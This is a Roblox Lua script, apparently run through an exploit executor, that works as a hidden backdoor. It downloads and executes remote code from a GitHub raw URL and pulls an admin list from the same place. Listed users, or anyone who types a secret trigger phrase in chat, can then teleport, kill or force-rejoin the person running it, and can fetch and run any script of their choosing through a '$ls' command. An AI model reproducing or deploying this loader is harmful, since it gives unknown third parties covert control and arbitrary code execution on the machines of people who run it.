warn('LOADING [ 1 ]')

local Players = game:GetService'Players'
local HttpSer = game:GetService'HttpService'

local Admins = HttpSer:JSONDecode(game:HttpGet"https://raw.githubusercontent.com/Metacalled2/DIR/main/Hosts/AdminTable")
local Hooks = game:HttpGet("https://raw.githubusercontent.com/Metacalled2/DIR/main/Hosts/Hook")
local Script_PH = "https://raw.githubusercontent.com/Metacalled2/DIR/main/Scripts/"

for i = 1,#Admins do
 warn(Admins[i].U)
end

loadstring(Hooks)()

local function Connect(Obj)
 
 Obj.Chatted:Connect(function(Chat)
   
    if Chat:lower():sub(1,7) == ("$bring ")  then
       if Players.LocalPlayer.Name:lower():match(string.sub(Chat, 8):lower()) then
         Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Obj.Character.HumanoidRootPart.CFrame
       end
    end
    
    if Chat:lower():sub(1,10) == ("/e $bring ")  then
       if Players.LocalPlayer.Name:lower():match(string.sub(Chat, 11):lower()) then
         Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Obj.Character.HumanoidRootPart.CFrame
       end
    end
   
    if Chat:lower():sub(1,6) == ("$kill ") then
       if Players.LocalPlayer.Name:lower():match(string.sub(Chat, 7):lower()) then
         Players.LocalPlayer.Character.Humanoid.Health = 0
       end
    end
    
    if Chat:lower():sub(1,9) == ("/e $kill ") then
       if Players.LocalPlayer.Name:lower():match(string.sub(Chat, 10):lower()) then
         Players.LocalPlayer.Character.Humanoid.Health = 0
       end
    end
   
    if Chat:lower():sub(1,8) == ("$reload ") then
       if Players.LocalPlayer.Name:lower():match(string.sub(Chat, 9):lower()) then
         game:GetService'TeleportService':Teleport(game.PlaceId)
       end
    end
   
    if Chat:lower():sub(1,4) == ("$ls ") then
      local SpacePercent = string.sub(Chat, 5)
      SpacePercent = SpacePercent:gsub(" ", "%%20")
      loadstring(game:HttpGet(Script_PH .. SpacePercent .. ".lua"))()
    end

end)

end

local function IsAdmin(ID)
  
  local IsAdmin = false
  
   for i = 1,#Admins do
     if Admins[i].U == ID then
      IsAdmin = true
      return true
     end
   end
  
   if not IsAdmin then
    return false
   end
end

Players.PlayerAdded:Connect(function(...)
   local Player = { ... }
    
   if IsAdmin(Player[1].UserId) then
    Connect(Player[1])
   end
  
   Player[1].Chatted:Connect(function(A)
     if A == "/e Hey! Anyone There? -M" then
       Connect(Player[1])
     end
   end)
end)

wait(4)

for I, V in pairs(Players:GetPlayers()) do
  if IsAdmin(V.UserId) then
   print(V.UserId .. " FOUND!")
   Connect(V)
  end
  
  V.Chatted:Connect(function(A)
     if A == "/e Hey! Anyone There? -M" then
       Connect(V)
     end
  end)
end
